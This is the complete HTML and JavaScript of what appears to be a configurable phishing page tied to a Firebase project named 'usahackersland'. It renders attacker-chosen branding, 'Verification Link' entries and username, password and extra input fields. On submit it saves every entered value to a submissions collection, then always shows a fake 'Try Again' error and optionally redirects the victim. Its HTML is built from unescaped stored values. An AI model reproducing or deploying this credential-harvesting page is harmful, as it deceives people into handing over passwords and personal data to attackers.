<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title></title>
<meta name="description">
<meta property="og:title">
<meta property="og:description">
<meta property="og:image">

<style>
body{
  font-family:Arial,Helvetica,sans-serif;
  background:#f4f6f8;
  padding:20px;
}

/* PAGE */
#page{
  max-width:600px;
  margin:auto;
  border-radius:10px;
  overflow:hidden;
  background:#fff;
}

/* BACKGROUND IMAGE SUPPORT */
.bg{
  background-repeat:no-repeat;
  background-position:center;
  background-size:cover;
}

/* CONTENT */
#content{padding:18px}

/* MEDIA */
.builder-media{text-align:center;margin-bottom:12px}
.builder-media img{max-width:140px;margin-bottom:8px}
.banner img{width:100%;border-radius:8px;margin-bottom:10px}

/* TEXT */
h2{text-align:center;margin:8px 0}
.subtitle{text-align:center;color:#555}
.description{margin:10px 0}

/* GALLERY */
.gallery{
  display:grid;
  grid-template-columns:repeat(auto-fit,minmax(120px,1fr));
  gap:8px;
  margin:12px 0;
}
.gallery img{width:100%;border-radius:6px}

/* EMBED LINKS */
.embedLink{
  background:#e8f0fe;
  padding:10px;
  border-radius:6px;
  margin:8px 0;
  font-size:14px;
  word-break:break-word;
  overflow-wrap:anywhere;
}
.embedLink a{
  display:inline-block;
  margin-top:4px;
  text-decoration:none;
  color:#1976d2;
}
.embedLink small{
  display:block;
  margin-top:4px;
  color:#555;
}

/* FORM */
form{
  max-width:420px;
  margin:12px auto;
}
input,button{
  width:100%;
  padding:10px;
  margin:8px 0;
  border-radius:6px;
  border:1px solid #ccc;
  box-sizing:border-box;
}
button{
  border:none;
  color:#fff;
  cursor:pointer;
}

/* FOOTER */
footer{
  text-align:center;
  font-size:12px;
  margin-top:14px;
  color:#777;
}

#tryAgain{
  color:#b71c1c;
  font-weight:bold;
  text-align:center;
  display:none;
}
</style>

<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
</head>

<body>
<div id="page">
  <div id="content">

    <div id="media" class="builder-media"></div>
    <div id="banner" class="banner"></div>

    <h2 id="title"></h2>
    <p id="subtitle" class="subtitle"></p>

    <div id="gallery" class="gallery"></div>
    <p id="description" class="description"></p>

    <div id="videos"></div>
    <div id="links"></div>

    <div id="warning"></div>
    <div id="tryAgain">⚠️ Try Again</div>

    <form id="form"></form>

    <footer id="footer"></footer>
  </div>
</div>

<script>
const $ = id => document.getElementById(id);

firebase.initializeApp({
  apiKey:"AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
  authDomain:"usahackersland.firebaseapp.com",
  projectId:"usahackersland"
});
const db = firebase.firestore();

const formId = new URLSearchParams(location.search).get("id");

db.collection("forms").doc(formId).get().then(doc=>{
  if(!doc.exists) return;
  const f = doc.data();

  /* SEO */
  document.title = f.seoTitle || "";
  document.querySelector('meta[name="description"]').content = f.metaDesc || "";
  document.querySelector('meta[property="og:title"]').content = f.seoTitle || "";
  document.querySelector('meta[property="og:description"]').content = f.metaDesc || "";
  document.querySelector('meta[property="og:image"]').content = f.ogImage || "";

  /* BACKGROUND IMAGE (FIXED) */
  if(f.bgColor) $("page").style.background = f.bgColor;
  if(f.bgImageURL){
    $("page").classList.add("bg");
    $("page").style.backgroundImage = `url(${f.bgImageURL})`;
    $("page").style.backgroundSize = f.bgSize || "cover";
  }

  /* MEDIA */
  if(f.avatarURL) $("media").innerHTML += `<img src="${f.avatarURL}" style="width:90px;border-radius:50%">`;
  if(f.logoURL) $("media").innerHTML += `<img src="${f.logoURL}">`;
  if(f.bannerURL) $("banner").innerHTML = `<img src="${f.bannerURL}">`;

  /* TEXT */
  if(f.title){
    $("title").innerText = f.title;
    $("title").style.color = f.titleColor || "#000";
  }
  if(f.subtitle){
    $("subtitle").innerText = f.subtitle;
    $("subtitle").style.color = f.subtitleColor || "#555";
  }
  if(f.description) $("description").innerText = f.description;

  /* GALLERY */
  (f.galleryImages || []).filter(Boolean).forEach(img=>{
    $("gallery").innerHTML += `<img src="${img}">`;
  });

  /* VIDEOS */
  (f.videoLinks || []).filter(Boolean).forEach(v=>{
    if(v.includes("youtube")){
      const id = v.split("v=")[1];
      $("videos").innerHTML += `
        <div class="video">
          <iframe src="https://www.youtube.com/embed/${id}" allowfullscreen></iframe>
        </div>`;
    }
  });

  /* EMBED LINKS (RENAMED & NUMBERED) */
  let linkCount = 1;
  (f.embedLinks || []).forEach(l=>{
    if(!l.show || !l.url) return;

    $("links").innerHTML += `
      <div class="embedLink">
        <strong>${l.text || "Verification Link"} ${linkCount}</strong>
        <a href="${l.url}" target="_blank">Open link</a>
        ${l.desc ? `<small>${l.desc}</small>` : ""}
      </div>
    `;
    linkCount++;
  });

  /* WARNING */
  if(f.enableWarning && f.warning){
    $("warning").innerHTML =
      `<p style="color:#b71c1c;text-align:${f.warningPosition||"center"}">${f.warning}</p>`;
  }

  /* FORM */
  const form = $("form");

  if(f.addAuth){
    if(f.usernamePlaceholder)
      form.innerHTML += `<input name="username" placeholder="${f.usernamePlaceholder}" required>`;
    if(f.passwordPlaceholder)
      form.innerHTML += `<input type="password" name="password" placeholder="${f.passwordPlaceholder}" required>`;
  }

  (f.extraFields || []).filter(Boolean).forEach(v=>{
    form.innerHTML += `<input name="${v}" placeholder="${v}" required>`;
  });

  if(f.showGenerateBtn){
    const g = document.createElement("button");
    g.type = "button";
    g.textContent = f.generateBtnText;
    g.style.background = "#6c757d";
    form.appendChild(g);
  }

  if(f.showMainBtn){
    const b = document.createElement("button");
    b.type = "submit";
    b.textContent = f.buttonText;
    b.style.background = f.btnColor || "#1976d2";
    form.appendChild(b);
  }

  if(f.footerText) $("footer").innerText = f.footerText;

  form.onsubmit = e => submitForm(e,f);
});

/* SUBMIT */
function submitForm(e,f){
  e.preventDefault();

  const data = {};
  document.querySelectorAll("#form input").forEach(i=>{
    data[i.name] = i.value;
  });

  db.collection("submissions").add({
    formId,
    data,
    createdAt: new Date().toISOString()
  }).then(()=>{
    $("tryAgain").style.display = "block";
    setTimeout(()=>$("tryAgain").style.display="none",3000);

    if(f.enableRedirect && f.redirectURL){
      setTimeout(()=>location.href = f.redirectURL,1500);
    }
  });
}
</script>
</body>
</html>
